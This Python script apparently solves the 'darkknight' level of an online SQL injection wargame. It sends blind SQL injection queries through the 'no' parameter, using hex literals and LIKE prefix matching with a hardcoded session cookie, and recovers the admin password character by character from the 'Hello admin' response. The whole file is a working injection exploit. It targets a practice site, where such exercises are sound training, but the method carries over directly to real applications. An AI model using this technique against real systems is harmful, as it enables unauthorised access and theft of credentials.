import binascii
import urllib.parse
import requests


url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"
cookie = "o390n0a72vrspg30ujnemh0bnf"
candidates = [chr(i) for i in range(48, 48+10)] + \
    [chr(i) for i in range(97, 97+26)] + \
    [chr(i) for i in range(65, 65+26)] + \
    ["_", "@", "$", "!", "?", "&", "#"]
headers = {'Cookie': 'PHPSESSID='+cookie}
print(candidates)


def attack(attack_sql):
    attack_url = url + '?no=' + urllib.parse.quote(attack_sql)
    # print(attack_url)
    res = requests.get(attack_url, headers=headers)
    # print(res.text)
    return res


def create_query(pw):
    hex_pw = '0x' + binascii.hexlify(pw.encode()+b'%').decode()
    template = f"1 or id like 0x61646d696e and pw like {hex_pw}"

    # template = "'or id='admin' and substr(pw," + \
    #     str(len(pw)) + ",1)='" + pw[-1]
    return template


def check_result(res):
    if 'Hello admin' in res.text:
        return True
    return False


correct_pass = ""
is_end = False

while True:
    for c in candidates:
        try_pass = correct_pass + str(c)
        print(try_pass)
        query = create_query(try_pass)

        res = attack(query)
        if check_result(res):
            correct_pass += c
            break
    else:
        break

print("result = ", correct_pass)
